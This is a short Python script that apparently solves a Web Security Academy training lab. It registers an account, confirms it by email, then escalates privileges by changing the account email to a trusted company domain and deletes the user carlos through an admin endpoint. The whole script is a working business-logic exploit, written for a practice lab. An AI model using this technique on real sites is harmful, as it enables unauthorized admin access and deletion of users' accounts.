from web_security_academy.core.email_client import EmailClient
from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
import re


def solve_lab(session):
    email_client = EmailClient(session)
    email = email_client.address

    # Start registering account
    csrf = session.get_csrf_token("/register")
    logger.info("Registering an account with the following data:")
    data = {
        "csrf": csrf,
        "username": "attacker",
        "email": email_client.address,
        "password": "123456",
    }
    logger.info(data)
    session.post_path("/register", data=data)

    # Finish registering account
    email_client.update_emails()
    email = email_client.emails[-1]

    logger.success("Received the following email:")
    for category in ("Sent", "From", "To", "Subject"):
        print(f"{category}:".ljust(10) + email[category])
    print(f"\n{email['Body']}")

    url = re.findall(r"http[^\"]+", str(email["Body"]))[0]
    logger.info(f'Finish registering account by visiting "{url}"...')
    session.get(url)

    # Privilege escalation
    resp = session.login("attacker", "123456")
    csrf = session.get_csrf_token("/my-account")

    email = "attacker@dontwannacry.com"
    data = {"csrf": csrf, "email": email}
    logger.info(f'Changing email to "{email}"...')
    session.post_path("/my-account/change-email", data=data)

    logger.info("Deleting user carlos...")
    session.get_path("/admin/delete?username=carlos")
